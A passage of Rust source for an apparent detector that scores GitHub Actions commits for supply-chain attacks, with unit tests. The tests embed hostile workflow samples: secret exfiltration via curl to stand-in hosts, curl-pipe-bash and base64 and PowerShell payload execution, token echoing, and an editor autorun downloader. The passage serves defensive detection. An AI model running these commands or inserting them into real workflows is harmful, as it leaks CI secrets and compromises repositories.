        add_factor(&mut finding, 2, "enumerates_environment_or_secrets");
    }
    if exfiltrates_externally {
        add_factor(&mut finding, 2, "external_network_or_exfil_path");
    }
    if (secret_enumeration_exfil_path && explicit_secret_refs < 2)
        || (token_exposure && exfiltrates_externally)
    {
        strong_workflow_signal = true;
        add_factor(
            &mut finding,
            6,
            "workflow_secret_enumeration_and_external_exfiltration",
        );
    }

    if adds_skip_guard {
        add_factor(&mut finding, 2, "adds_actor_or_label_based_skip_guard");
        if removed_gates || publishes_registry || adds_auto_push_or_merge {
            strong_workflow_signal = true;
            add_factor(&mut finding, 3, "skip_guard_with_sensitive_workflow_change");
        }
    }

    if agentic_context {
        add_factor(&mut finding, 1, "adds_agentic_or_llm_tooling");
    }
    if reads_untrusted_text {
        add_factor(&mut finding, 1, "reads_untrusted_issue_pr_or_comment_text");
    }
    if adds_comment_or_review_trigger {
        add_factor(&mut finding, 1, "adds_comment_or_review_trigger");
    }
    if fetches_fork_pr_head {
        add_factor(&mut finding, 2, "fetches_pr_head_from_fork_or_pull_ref");
    }
    if reads_pr_metadata {
        add_factor(&mut finding, 1, "reads_pr_metadata_for_agent");
    }
    if grants_agentic_tools {
        add_factor(&mut finding, 2, "grants_agent_shell_or_edit_tools");
    }
    if hands_agent_write_token {
        add_factor(&mut finding, 2, "hands_agent_repo_write_token");
    }
    if commenter_write_gate {
        add_factor(&mut finding, 0, "commenter_must_have_write_or_admin");
    }
    if merged_pr_only_gate {
        add_factor(&mut finding, 0, "requires_merged_non_main_pr");
    }
    if agentic_context
        && reads_untrusted_text
        && (adds_comment_or_review_trigger || adds_pull_request_target)
    {
        add_factor(
            &mut finding,
            3,
            "agentic_workflow_reads_untrusted_user_text",
        );
        if adds_write_permissions
            || adds_auto_push_or_merge
            || publishes_registry
            || registry_auth
            || inherits_secrets
        {
            strong_workflow_signal = true;
            add_factor(
                &mut finding,
                6,
                "agentic_prompt_injection_with_write_or_secret_capability",
            );
        }
        if uses_self_hosted_runner {
            strong_workflow_signal = true;
            add_factor(
                &mut finding,
                4,
                "agentic_prompt_injection_on_self_hosted_runner",
            );
        }
        if fetches_fork_pr_head
            && reads_pr_metadata
            && grants_agentic_tools
            && (hands_agent_write_token || adds_write_permissions || adds_auto_push_or_merge)
        {
            strong_workflow_signal = true;
            add_factor(
                &mut finding,
                5,
                "agentic_prompt_injection_over_fork_pr_material",
            );
        }
        if commenter_write_gate {
            add_factor(&mut finding, -2, "maintainer_gated_trigger");
        }
        if merged_pr_only_gate {
            add_factor(&mut finding, -1, "merged_pr_only_scope_reduction");
        }
    }

    if modifies_branch_protection {
        add_factor(&mut finding, 3, "modifies_branch_protection_or_rulesets");
        if adds_write_permissions
            || adds_auto_push_or_merge
            || registry_auth
            || hands_repo_write_token
        {
            strong_workflow_signal = true;
            add_factor(
                &mut finding,
                5,
                "workflow_modifies_branch_protection_with_write_capability",
            );
        }
    }

    if adds_dispatch_trigger {
        add_factor(&mut finding, 1, "adds_dispatch_trigger");
        if adds_write_permissions
            || publishes_registry
            || adds_auto_push_or_merge
            || creates_pr_from_ci
        {
            if removed_gates || adds_artifact_input || manual_oidc {
                strong_workflow_signal = true;
                add_factor(
                    &mut finding,
                    5,
                    "dispatch_backdoor_with_write_or_publish_capability",
                );
            }
            if hands_repo_write_token {
                strong_workflow_signal = true;
                add_factor(&mut finding, 4, "dispatch_backdoor_with_repo_token");
            }
        }
    }

    if uses_unpinned_reusable_workflow {
        add_factor(&mut finding, 2, "uses_unpinned_reusable_workflow_ref");
        if has_privileged_mutable_reusable_workflow(&action_uses, privileged_workflow_capability) {
            strong_workflow_signal = true;
            add_factor(
                &mut finding,
                5,
                "unpinned_reusable_workflow_with_secret_inheritance",
            );
        }
    }

    if uses_self_hosted_runner {
        add_factor(&mut finding, 2, "uses_self_hosted_runner");
        if (adds_pull_request_target && checks_out_pr_head)
            || (adds_workflow_run && downloads_workflow_artifact)
        {
            strong_workflow_signal = true;
            add_factor(&mut finding, 6, "untrusted_code_on_self_hosted_runner");
        }
        if hands_repo_write_token
            && (fetches_external_artifact || fetches_fork_pr_head || adds_agentic_tooling)
        {
            strong_workflow_signal = true;
            add_factor(
                &mut finding,
                4,
                "self_hosted_runner_with_repo_token_and_untrusted_input",
            );
        }
    }

    if protective_workflow_context && adds_check_bypass {
        add_factor(&mut finding, 3, "adds_protective_workflow_bypass_filter");
        if removed_gates
            || adds_skip_guard
            || adds_continue_on_error
            || adds_write_permissions
            || hands_repo_write_token
        {
            strong_workflow_signal = true;
            add_factor(
                &mut finding,
                5,
                "protective_workflow_bypass_with_sensitive_follow_on_change",
            );
        }
    }

    if publishes_dynamic_artifact {
        add_factor(&mut finding, 3, "publishes_dynamic_artifact_path");
        if manual_oidc || registry_auth {
            strong_workflow_signal = true;
            add_factor(
                &mut finding,
                5,
                "dynamic_artifact_publish_with_registry_auth",
            );
        }
        if removed_gates || broad_trigger || adds_artifact_input {
            strong_workflow_signal = true;
            add_factor(
                &mut finding,
                4,
                "dynamic_artifact_publish_with_release_boundary_change",
            );
        }
    }

    if publishes_temp_or_home_artifact {
        add_factor(&mut finding, 2, "publishes_runner_temp_or_home_artifact");
        if manual_oidc || removed_gates || broad_trigger {
            strong_workflow_signal = true;
            add_factor(
                &mut finding,
                4,
                "runner_local_artifact_publish_with_boundary_change",
            );
        }
        if stages_artifact_in_temp_or_home && (publishes_registry || registry_auth) {
            strong_workflow_signal = true;
            add_factor(
                &mut finding,
                4,
                "staged_local_artifact_publish_with_registry_capability",
            );
        }
    }

    if fetches_untrusted_artifact
        && publishes_registry
        && (strong_workflow_signal || include_weak_workflow_signals)
    {
        add_factor(&mut finding, 1, "fetches_artifact_before_publish");
    }

    if fetches_external_artifact && publishes_registry {
        add_factor(&mut finding, 2, "fetches_external_artifact_before_publish");
        if manual_oidc || registry_auth || removed_gates || broad_trigger {
            strong_workflow_signal = true;
            add_factor(
                &mut finding,
                5,
                "external_artifact_publish_with_boundary_change",
            );
        }
    }

    if publishes_local_archive && committed_archive {
        strong_workflow_signal = true;
        add_factor(&mut finding, 9, "publishes_committed_archive_artifact");
    } else if publishes_local_archive {
        add_factor(&mut finding, 2, "publishes_local_archive_path");
        if broad_trigger && removed_gates {
            strong_workflow_signal = true;
            add_factor(
                &mut finding,
                4,
                "local_archive_publish_with_release_gate_rewrite",
            );
        }
        if stages_artifact_in_temp_or_home && (publishes_registry || registry_auth) {
            strong_workflow_signal = true;
            add_factor(
                &mut finding,
                4,
                "staged_local_artifact_publish_with_registry_capability",
            );
        }
    } else if committed_archive {
        add_factor(&mut finding, 2, "adds_archive_blob_in_same_commit");
        if publishes_registry && broad_trigger {
            strong_workflow_signal = true;
            add_factor(&mut finding, 4, "registry_publish_with_committed_archive");
        }
    }

    if publishes_registry && (strong_workflow_signal || include_weak_workflow_signals) {
        add_factor(&mut finding, 1, "adds_registry_publish");
    }
    if manual_oidc {
        add_factor(&mut finding, 1, "adds_manual_oidc_token_exchange");
    } else if oidc_or_provenance {
        add_factor(&mut finding, 0, "adds_oidc_or_provenance_token_path");
    }
    if registry_auth {
        add_factor(&mut finding, 0, "adds_registry_auth_token_handling");
    }
    if broad_trigger && (strong_workflow_signal || include_weak_workflow_signals) {
        add_factor(&mut finding, 1, "adds_broader_or_tag_trigger");
    }
    if removed_gates && (strong_workflow_signal || include_weak_workflow_signals) {
        add_factor(&mut finding, 1, "removes_release_gates_or_build_steps");
    }
    if bulk_workflow {
        add_factor(&mut finding, 0, "bulk_workflow_mutation");
    }
    if generated_workflow_regen {
        add_factor(&mut finding, 0, "generated_workflow_regeneration");
    }
    if locked_workflow_bundle {
        add_factor(&mut finding, 0, "locked_workflow_bundle_regeneration");
    }

    if generated_dependency_pin_regen
        && !committed_archive
        && !has_action_manifest_change
        && !adds_agent_instruction_file
        && !adds_agent_editor_autorun_file
        && !token_exposure
        && removed_token_exposure.is_empty()
        && finding.message_evidence.is_empty()
    {
        return Ok(None);
    }

    let has_core_workflow_factor = finding
        .factors
        .iter()
        .any(|factor| CORE_WORKFLOW_FACTORS.iter().any(|core| factor == core));

    if enrich && finding.score > 0 {
        finding.actions_runs = fetch_runs(repo, sha);
        finding.pull_requests = fetch_prs(repo, sha);
        if strong_workflow_signal
            || !finding.message_evidence.is_empty()
            || include_weak_workflow_signals
        {
            if finding.pull_requests.is_empty() {
                add_factor(&mut finding, 1, "no_public_pr_association");
            }
            if !finding.actions_runs.is_empty() {
                add_factor(&mut finding, 1, "actions_run_for_suspicious_sha");
            }
        }
    }

    if !strong_workflow_signal
        && finding.message_evidence.is_empty()
        && !include_weak_workflow_signals
    {
        return Ok(None);
    }

    if generated_workflow_regen && !has_core_workflow_factor && finding.message_evidence.is_empty()
    {
        return Ok(None);
    }

    if locked_workflow_bundle && !has_core_workflow_factor && finding.message_evidence.is_empty() {
        return Ok(None);
    }

    Ok(if finding.score > 0 {
        Some(finding)
    } else {
        None
    })
}

fn print_finding(finding: &Finding, explain: bool) {
    println!(
        "{} score={} {}@{} {}",
        finding.severity().to_uppercase(),
        finding.score,
        finding.repo,
        prefix_sha(&finding.sha),
        finding.date
    );
    println!("  {}", finding.url);
    println!("  author: {}", finding.author);
    println!("  message: {}", finding.message);
    println!("  factors: {}", finding.factors.join(", "));
    println!("  workflows: {}", finding.workflow_files.join(", "));
    if explain {
        print_finding_explanation(finding);
    }
    if !finding.archive_files.is_empty() {
        println!("  archives: {}", finding.archive_files.join(", "));
    }
    if !finding.message_evidence.is_empty() {
        println!("  message evidence:");
        for line in &finding.message_evidence {
            println!("    - {line}");
        }
    }
    if !finding.archive_blobs.is_empty() {
        println!("  archive_blobs: {}", finding.archive_blobs.join("; "));
    }
    if !finding.npm_oidc_packages.is_empty() {
        println!(
            "  npm_oidc_packages: {}",
            finding.npm_oidc_packages.join(", ")
        );
    }
    if !finding.evidence_added.is_empty() {
        println!("  added evidence:");
        for line in &finding.evidence_added {
            println!("    + {line}");
        }
    }
    if !finding.evidence_removed.is_empty() {
        println!("  removed evidence:");
        for line in &finding.evidence_removed {
            println!("    - {line}");
        }
    }
    if !finding.pull_requests.is_empty() {
        println!("  prs: {}", finding.pull_requests.join("; "));
    }
    if !finding.actions_runs.is_empty() {
        println!("  runs: {}", finding.actions_runs.join("; "));
    }
    println!();
}

fn print_finding_explanation(finding: &Finding) {
    let mut score_by_factor = BTreeMap::<String, i32>::new();
    for hit in &finding.factor_hits {
        *score_by_factor.entry(hit.factor.clone()).or_default() += hit.score;
    }
    for factor in &finding.factors {
        score_by_factor.entry(factor.clone()).or_default();
    }

    let mut families = BTreeMap::<&str, i32>::new();
    let mut core = Vec::new();
    let mut mitigations = Vec::new();
    let mut context = Vec::new();

    for (factor, score) in &score_by_factor {
        let meta = factor_meta(factor);
        let family = meta.map(|meta| meta.family).unwrap_or("uncategorized");
        *families.entry(family).or_default() += *score;

        let kind = meta.map(|meta| meta.kind).unwrap_or_else(|| {
            if CORE_WORKFLOW_FACTORS
                .iter()
                .any(|core_factor| core_factor == factor)
            {
                FactorKind::Core
            } else if *score < 0 {
                FactorKind::Mitigation
            } else {
                FactorKind::Context
            }
        });

        match kind {
            FactorKind::Core => core.push(factor.clone()),
            FactorKind::Mitigation => mitigations.push(factor.clone()),
            FactorKind::Context => context.push(factor.clone()),
        }
    }

    println!("  explanation:");
    let family_summary = families
        .iter()
        .filter(|(_, score)| **score != 0)
        .map(|(family, score)| format!("{family} ({score:+})"))
        .collect::<Vec<_>>();
    if !family_summary.is_empty() {
        println!("    families: {}", family_summary.join(", "));
    }
    if !core.is_empty() {
        println!("    core signals:");
        for factor in core.iter().take(8) {
            println!("      - {}", factor_description(factor));
        }
    }
    if !mitigations.is_empty() {
        println!("    mitigations:");
        for factor in mitigations.iter().take(5) {
            println!("      - {}", factor_description(factor));
        }
    }

    let mut breakdown = score_by_factor.into_iter().collect::<Vec<_>>();
    breakdown.sort_by(|left, right| {
        right
            .1
            .abs()
            .cmp(&left.1.abs())
            .then_with(|| left.0.cmp(&right.0))
    });
    println!("    score breakdown:");
    for (factor, score) in breakdown.iter().filter(|(_, score)| *score != 0).take(10) {
        println!("      {score:+} {factor}");
    }
    if finding.score >= 10 {
        println!("    decision: score >= 10, so this finding is critical and returns exit code 1");
    } else {
        println!(
            "    decision: score < 10, so this finding does not trigger the critical exit threshold"
        );
    }

    if context.len() > 8 {
        println!(
            "    context: {} additional context factors omitted",
            context.len() - 8
        );
    }
}

fn factor_description(factor: &str) -> String {
    if let Some(meta) = factor_meta(factor) {
        format!("{}: {}", meta.name, meta.description)
    } else {
        format!("{factor}: {}", humanize_factor(factor))
    }
}

fn prefix_sha(sha: &str) -> &str {
    sha.get(..12).unwrap_or(sha)
}

fn truncate_line(value: &str, max_len: usize) -> String {
    value.chars().take(max_len).collect()
}

#[cfg(test)]
mod tests {
    use super::{
        ACTION_MANIFEST_COMPOSITE_RE, ACTION_MANIFEST_DOCKER_RE, ACTION_MANIFEST_REMOTE_SCRIPT_RE,
        AGENT_EDITOR_AUTORUN_HOOK_RE, AGENT_RUNTIME_BOOTSTRAP_RE, BASE64_PAYLOAD_EXECUTION_RE,
        CACHE_OR_SETUP_ACTION_RE, CACHE_OR_SETUP_CONTEXT_RE, CLOUD_SECRET_WITH_EXTERNAL_NETWORK_RE,
        DOCKER_SOCKET_EXPOSURE_RE, GHOSTACTION_WORKFLOW_NAME_RE, GIT_CREDENTIAL_PERSISTENCE_RE,
        GITHUB_ENV_UNTRUSTED_WRITE_RE, GITHUB_OUTPUT_UNTRUSTED_WRITE_RE,
        GITHUB_SCRIPT_DYNAMIC_CODE_RE, GITHUB_SCRIPT_UNTRUSTED_CONTEXT_RE,
        PACKAGE_SCRIPT_GUARD_REMOVAL_RE, PERSIST_CREDENTIALS_FALSE_RE, PERSIST_CREDENTIALS_TRUE_RE,
        POWERSHELL_ENCODED_COMMAND_RE, PR_HEAD_CHECKOUT_RE, PR_MERGE_REF_CHECKOUT_RE,
        REMOTE_SCRIPT_EXECUTION_RE, REMOVED_PR_MERGE_REF_CHECKOUT_RE, REMOVED_PR_TARGET_RE,
        REMOVED_UNTRUSTED_CODE_EXECUTION_RE, SENSITIVE_ARTIFACT_UPLOAD_RE, SENSITIVE_CACHE_PATH_RE,
        UNTRUSTED_CODE_EXECUTION_RE, UNTRUSTED_REF_SHELL_INTERPOLATION_RE,
        WORKFLOW_RUN_HEAD_CHECKOUT_RE, action_ref_changed, action_ref_downgrades_to_mutable,
        decode_possible_base64, explicit_secret_reference_count,
        has_added_agent_editor_autorun_file, has_added_agent_instruction_file,
        has_added_agent_payload_script, has_dependency_manifest_file,
        has_external_non_github_network_call, has_privileged_mutable_reusable_workflow,
        has_privileged_mutable_third_party_dependency, has_privileged_workflow_capability,
        has_pull_request_target_cache_poisoning_remediation_context,
        has_pull_request_target_untrusted_code_mitigation, has_removed_protective_workflow,
        has_secret_enumeration_exfil_path, has_suspicious_workflow_file,
        is_generated_dependency_pin_regen, is_sensitive_automation_file,
        known_compromised_action_reason, message_secret_evidence, redact_message, redact_secret,
        removed_token_exposure_lines, token_exposure_lines,
    };
    use crate::github_actions::extract_action_uses;
    use base64::Engine;
    use base64::engine::general_purpose::STANDARD;
    use serde_json::json;

    #[test]
    fn redacts_direct_token() {
        let token = format!("{}{}", "ghp_", "123456789012345678901234567890123456");
        let input = format!("leak {token}");
        let output = redact_message(&input);
        assert!(output.contains("ghp_1234...3456"));
        assert!(!output.contains(&token));
    }

    #[test]
    fn decodes_base64_rounds() {
        let token = format!("{}{}", "ghp_", "123456789012345678901234567890123456");
        let encoded = STANDARD.encode(token.as_bytes());
        let values = decode_possible_base64(&encoded, 3);
        assert_eq!(values[0], token);
    }

    #[test]
    fn detects_teampcp_message_evidence() {
        let token = format!("{}{}", "ghp_", "123456789012345678901234567890123456");
        let marker = format!(
            "LongLiveTheResistanceAgainstMachines:{}",
            STANDARD.encode(token.as_bytes())
        );
        let (score, factors, evidence) = message_secret_evidence(&marker);
        assert!(score >= 12);
        assert!(
            factors
                .iter()
                .any(|factor| factor == "prompt_injection_marker_decodes_to_github_token")
        );
        assert!(!evidence.is_empty());
    }

    #[test]
    fn finds_token_exposure_line() {
        let lines = token_exposure_lines("+echo $NPM_TOKEN | base64\n+echo safe");
        assert_eq!(lines, vec!["echo $NPM_TOKEN | base64".to_string()]);
    }

    #[test]
    fn redacts_secret_variants() {
        let token = format!(
            "{}{}",
            "github_pat_",
            "testtokenvalue0000000000000000000000000000000000000000000000000000000000"
        );
        assert_eq!(redact_secret(&token), "github_pat_tes...0000");
    }

    #[test]
    fn privileged_workflow_with_mutable_third_party_action_is_strong_signal() {
        let action_uses = extract_action_uses(
            "+permissions: write-all\n+jobs:\n+  release:\n+    steps:\n+      - uses: third-party/deploy@v1",
            "owner/repo",
        );
        let privileged = has_privileged_workflow_capability(true, false, false, false, false);
        assert!(has_privileged_mutable_third_party_dependency(
            &action_uses,
            privileged
        ));
    }

    #[test]
    fn privileged_workflow_with_sha_pinned_third_party_action_is_not_strong_signal() {
        let action_uses = extract_action_uses(
            "+permissions: write-all\n+jobs:\n+  test:\n+    steps:\n+      - uses: third-party/deploy@11bd71901bbe5b1630ceea73d27597364c9af683",
            "owner/repo",
        );
        let privileged = has_privileged_workflow_capability(true, false, false, false, false);
        assert!(!has_privileged_mutable_third_party_dependency(
            &action_uses,
            privileged
        ));
    }

    #[test]
    fn privileged_reusable_workflow_on_branch_is_strong_signal() {
        let action_uses = extract_action_uses(
            "+jobs:\n+  publish:\n+    uses: third-party/reusable/.github/workflows/publish.yml@main\n+    secrets: inherit",
            "owner/repo",
        );
        let privileged = has_privileged_workflow_capability(false, false, false, false, true);
        assert!(has_privileged_mutable_reusable_workflow(
            &action_uses,
            privileged
        ));
    }

    #[test]
    fn detects_action_ref_downgrade_to_mutable() {
        let removed = extract_action_uses(
            "-      - uses: third-party/deploy@11bd71901bbe5b1630ceea73d27597364c9af683",
            "owner/repo",
        );
        let added = extract_action_uses("-      - uses: third-party/deploy@v1", "owner/repo");
        assert!(action_ref_changed(&removed, &added));
        assert!(action_ref_downgrades_to_mutable(&removed, &added));
    }

    #[test]
    fn recognizes_known_compromised_action_hook() {
        for action in [
            "tj-actions/changed-files@v45",
            "reviewdog/action-setup@v1",
            "aquasecurity/trivy-action@v0.34.0",
            "aquasecurity/setup-trivy@v0.2.5",
        ] {
            let action_uses =
                extract_action_uses(&format!("+      - uses: {action}"), "owner/repo");
            assert!(known_compromised_action_reason(&action_uses[0]).is_some());
        }
    }

    #[test]
    fn treats_action_manifest_and_agent_instructions_as_sensitive_automation() {
        assert!(is_sensitive_automation_file("action.yml"));
        assert!(is_sensitive_automation_file("subdir/action.yaml"));
        assert!(is_sensitive_automation_file("CLAUDE.md"));
        assert!(is_sensitive_automation_file(".claude/settings.json"));
        assert!(is_sensitive_automation_file(".claude/setup.mjs"));
        assert!(is_sensitive_automation_file(".vscode/tasks.json"));
        assert!(is_sensitive_automation_file(".vscode/setup.mjs"));
        assert!(is_sensitive_automation_file(".github/workflows/ci.yml"));
    }

    #[test]
    fn detects_agent_editor_autorun_bootstrap_chain() {
        let files = vec![
            json!({
                "filename": ".claude/settings.json",
                "status": "added",
                "additions": 15,
                "deletions": 0
            }),
            json!({
                "filename": ".vscode/tasks.json",
                "status": "added",
                "additions": 13,
                "deletions": 0
            }),
            json!({
                "filename": ".claude/execution.js",
                "status": "added",
                "additions": 1,
                "deletions": 0
            }),
        ];
        let added = r#"
+    "SessionStart": [
+            "command": "node .vscode/setup.mjs"
+      "runOn": "folderOpen"
+const BUN_VERSION = "1.3.13";
+const ENTRY_SCRIPT = "execution.js";
+await downloadToFile(url, zipPath);
+execFileSync(binPath, [entryScriptPath], { stdio: "inherit" });
"#;
        assert!(has_added_agent_editor_autorun_file(&files));
        assert!(has_added_agent_payload_script(&files));
        assert!(AGENT_EDITOR_AUTORUN_HOOK_RE.is_match(added));
        assert!(AGENT_RUNTIME_BOOTSTRAP_RE.is_match(added));
    }

    #[test]
    fn distinguishes_real_dependency_updates_from_cover_messages() {
        let real_dependency_update = vec![json!({
            "filename": "package-lock.json",
            "status": "modified",
            "additions": 17,
            "deletions": 19
        })];
        let sensitive_automation_cover = vec![json!({
            "filename": ".claude/settings.json",
            "status": "added",
            "additions": 15,
            "deletions": 0
        })];

        assert!(has_dependency_manifest_file(&real_dependency_update));
        assert!(!has_dependency_manifest_file(&sensitive_automation_cover));
    }

    #[test]
    fn detects_removed_oidc_registry_token_exposure_forensics() {
        let removed = r#"
-          OIDC_TOKEN=$(curl -sH "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=npm:registry.npmjs.org" | jq -r .value)
-          NPM_TOKEN=$(curl -s -X POST https://registry.npmjs.org/-/npm/v1/oidc/token/exchange/package/%40cap-js%2Fsqlite -H "Authorization: Bearer $OIDC_TOKEN" | jq -r .token)
-          echo $NPM_TOKEN | base64 -w 0 | base64 -w 0
"#;
        assert_eq!(
            removed_token_exposure_lines(removed),
            vec!["echo $NPM_TOKEN | base64 -w 0 | base64 -w 0".to_string()]
        );
    }

    #[test]
    fn detects_action_manifest_remote_script_execution() {
        let added = r#"
+runs:
+  using: "composite"
+  steps:
+    - run: curl https://audit.checkmarx.cx | bash
"#;
        let removed = r#"
-runs:
-  using: 'docker'
-  image: 'Dockerfile'
-  entrypoint: '/app/entrypoint.sh'
"#;
        assert!(ACTION_MANIFEST_COMPOSITE_RE.is_match(added));
        assert!(ACTION_MANIFEST_DOCKER_RE.is_match(removed));
        assert!(ACTION_MANIFEST_REMOTE_SCRIPT_RE.is_match(added));
    }

    #[test]
    fn detects_agent_instruction_and_protective_workflow_removal_context() {
        let files = vec![
            json!({
                "filename": "CLAUDE.md",
                "status": "added",
                "additions": 10,
                "deletions": 0
            }),
            json!({
                "filename": ".github/workflows/checkmarx-one-scan.yml",
                "status": "modified",
                "additions": 0,
                "deletions": 8
            }),
        ];
        assert!(has_added_agent_instruction_file(&files));
        assert!(has_removed_protective_workflow(
            &files,
            "-          cx_client_secret: ${{ secrets.CX_CLIENT_SECRET }}\n-          additional_params: --scan-types sast"
        ));
    }

    #[test]
    fn recognizes_generated_dependency_pin_regeneration_context() {
        assert!(is_generated_dependency_pin_regen(
            true,
            "ci: update to gagen 0.3 for maintainable pinning of all workflow dependencies"
        ));
        assert!(!is_generated_dependency_pin_regen(
            false,
            "ci: update to gagen 0.3 for maintainable pinning of all workflow dependencies"
        ));
        assert!(!is_generated_dependency_pin_regen(
            true,
            "add generated workflow that posts secrets"
        ));
    }

    #[test]
    fn detects_ghostaction_style_secret_exfiltration_shape() {
        let files = vec![json!({
            "filename": ".github/workflows/github-actions-security.yml",
            "status": "added",
            "additions": 20,
            "deletions": 0
        })];
        let added = r#"
+name: Github Actions Security
+on:
+  push:
+  workflow_dispatch:
+jobs:
+  audit:
+    steps:
+      - run: |
+          curl -X POST https://bold-dhawan.example.invalid/collect \
+            -d "pypi=${{ secrets.PYPI_API_TOKEN }}" \
+            -d "npm=${{ secrets.NPM_TOKEN }}" \
+            -d "docker=${{ secrets.DOCKERHUB_TOKEN }}"
"#;
        assert!(has_suspicious_workflow_file(&files));
        assert!(GHOSTACTION_WORKFLOW_NAME_RE.is_match(added));
        assert_eq!(explicit_secret_reference_count(added), 3);
        assert!(has_external_non_github_network_call(added));
    }

    #[test]
    fn links_secret_enumeration_to_actual_external_exfiltration() {
        let malicious = r#"
+      - run: printenv | curl -X POST --data-binary @- https://collector.example.invalid/env
"#;
        let benign_download_then_env_debug = r#"
+      windows_pre_build_command: |
+        $msiUrl = "https://aka.ms/download-jdk/microsoft-jdk-21-windows-x64.msi"
+        Invoke-WebRequest -Uri $msiUrl -OutFile $installerPath
+        Get-ChildItem Env:
"#;

        assert!(has_secret_enumeration_exfil_path(malicious));
        assert!(!has_secret_enumeration_exfil_path(
            benign_download_then_env_debug
        ));
    }

    #[test]
    fn detects_high_signal_credential_and_payload_primitives() {
        let credential_persistence = r#"
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+          persist-credentials: true
+      - run: git config --global url.https://x-access-token:${{ secrets.GITHUB_TOKEN }}@github.com/.insteadOf https://github.com/
"#;
        assert!(PERSIST_CREDENTIALS_TRUE_RE.is_match(credential_persistence));
        assert!(GIT_CREDENTIAL_PERSISTENCE_RE.is_match(credential_persistence));

        let sensitive_artifact = r#"
+      - uses: actions/upload-artifact@v4
+        with:
+          name: debug
+          path: |
+            .npmrc
+            ~/.aws/credentials
"#;
        assert!(SENSITIVE_ARTIFACT_UPLOAD_RE.is_match(sensitive_artifact));

        let sensitive_cache = r#"
+      - uses: actions/cache/save@v4
+        with:
+          path: ~/.docker/config.json
+          key: docker-${{ github.run_id }}
"#;
        assert!(SENSITIVE_CACHE_PATH_RE.is_match(sensitive_cache));

        let remote_payloads = r#"
+      - run: curl -fsSL https://example.invalid/install.sh | bash
+      - run: echo ZWNobyBwd25lZA== | base64 -d | bash
+      - run: pwsh -EncodedCommand SQBFAFgA
"#;
        assert!(REMOTE_SCRIPT_EXECUTION_RE.is_match(remote_payloads));
        assert!(BASE64_PAYLOAD_EXECUTION_RE.is_match(remote_payloads));
        assert!(POWERSHELL_ENCODED_COMMAND_RE.is_match(remote_payloads));
    }

    #[test]
    fn detects_untrusted_context_and_privileged_runtime_primitives() {
        let untrusted_context = r#"
+      - run: echo "BRANCH=${{ github.head_ref }}" >> "$GITHUB_ENV"
+      - run: echo "result=${{ github.event.pull_request.title }}" >> "$GITHUB_OUTPUT"
+      - uses: actions/github-script@v7
+        with:
+          script: |
+            const title = context.payload.pull_request.title
+            require('child_process').execSync(title)
+      - run: docker run -v /var/run/docker.sock:/var/run/docker.sock image
+      - run: echo "${{ github.ref_name }}"
"#;
        assert!(GITHUB_ENV_UNTRUSTED_WRITE_RE.is_match(untrusted_context));
        assert!(GITHUB_OUTPUT_UNTRUSTED_WRITE_RE.is_match(untrusted_context));
        assert!(GITHUB_SCRIPT_UNTRUSTED_CONTEXT_RE.is_match(untrusted_context));
        assert!(GITHUB_SCRIPT_DYNAMIC_CODE_RE.is_match(untrusted_context));
        assert!(DOCKER_SOCKET_EXPOSURE_RE.is_match(untrusted_context));
        assert!(UNTRUSTED_REF_SHELL_INTERPOLATION_RE.is_match(untrusted_context));

        let workflow_run_head = r#"
+on:
+  workflow_run:
+jobs:
+  release:
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.workflow_run.head_branch }}
"#;
        assert!(WORKFLOW_RUN_HEAD_CHECKOUT_RE.is_match(workflow_run_head));

        let package_guard = r#"
-      - run: npm ci --ignore-scripts
+      - run: npm config set ignore-scripts false
"#;
        assert!(PACKAGE_SCRIPT_GUARD_REMOVAL_RE.is_match(package_guard));

        let cloud_secret = r#"
+      - run: curl -H "Authorization: Bearer $AWS_SESSION_TOKEN" https://example.invalid/collect
+        env:
+          AWS_SESSION_TOKEN: ${{ secrets.AWS_SESSION_TOKEN }}
"#;
        assert!(CLOUD_SECRET_WITH_EXTERNAL_NETWORK_RE.is_match(cloud_secret));
    }

    #[test]
    fn ignores_common_safe_variants_for_new_primitives() {
        let benign_download =
            "+      - run: curl -fsSL https://example.invalid/tool.tar.gz -o tool.tar.gz";
        let benign_artifact = r#"
+      - uses: actions/upload-artifact@v4
+        with:
+          name: dist
+          path: dist/
"#;
        let benign_cache = r#"
+      - uses: actions/cache@v4
+        with:
+          path: node_modules
+          key: deps-${{ hashFiles('package-lock.json') }}
"#;

        assert!(!REMOTE_SCRIPT_EXECUTION_RE.is_match(benign_download));
        assert!(!SENSITIVE_ARTIFACT_UPLOAD_RE.is_match(benign_artifact));
        assert!(!SENSITIVE_CACHE_PATH_RE.is_match(benign_cache));
    }

    #[test]
    fn detects_pull_request_target_untrusted_code_execution_shape() {
        let added = r#"
+on:
+  pull_request_target:
+jobs:
+  test:
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+      - run: npm install
"#;
        assert!(PR_HEAD_CHECKOUT_RE.is_match(added));
        assert!(UNTRUSTED_CODE_EXECUTION_RE.is_match(added));
        assert!(!PERSIST_CREDENTIALS_FALSE_RE.is_match(added));
    }

    #[test]
    fn detects_pull_request_target_cache_poisoning_surface() {
        let added = r#"
+on:
+  pull_request_target:
+jobs:
+  benchmark-pr:
+    permissions:
+      contents: read
+    steps:
+      - uses: actions/checkout@v6.0.2
+        with:
+          ref: refs/pull/${{ github.event.pull_request.number }}/merge
+          persist-credentials: false
+      - name: Setup Tools
+        uses: tanstack/config/.github/setup@main
+      - run: pnpm nx run @benchmarks/bundle-size:build --outputStyle=stream --skipRemoteCache
"#;
        assert!(PR_MERGE_REF_CHECKOUT_RE.is_match(added));
        assert!(CACHE_OR_SETUP_ACTION_RE.is_match(added));
        assert!(CACHE_OR_SETUP_CONTEXT_RE.is_match(
            "+      - name: Setup Tools\n         uses: tanstack/config/.github/setup@main"
        ));
        assert!(UNTRUSTED_CODE_EXECUTION_RE.is_match(added));
    }

    #[test]
    fn detects_pull_request_target_cache_poisoning_remediation_shape() {
        let patch = r#"
-  pull_request_target:
-    if: github.event_name == 'pull_request_target'
-          ref: refs/pull/${{ github.event.pull_request.number }}/merge
-        uses: tanstack/config/.github/setup@main
-      - run: pnpm nx run @benchmarks/bundle-size:build --outputStyle=stream --skipRemoteCache
"#;
        let added = "";
        let removed = patch
            .lines()
            .filter(|line| line.starts_with('-'))
            .collect::<Vec<_>>()
            .join("\n");
        assert!(REMOVED_PR_TARGET_RE.is_match(&removed));
